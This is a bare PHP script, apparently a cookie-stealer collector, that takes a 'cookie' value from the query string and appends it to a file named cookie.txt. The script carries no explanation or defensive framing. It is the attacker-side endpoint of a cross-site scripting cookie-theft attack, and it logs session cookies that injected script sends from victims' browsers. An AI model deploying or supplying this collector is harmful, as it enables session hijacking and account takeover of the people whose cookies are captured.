<?php
	$cookie = $_GET['cookie'];
	$file = fopen('cookie.txt','a');
	fwrite($file,$cookie);
	fclose($file);
?>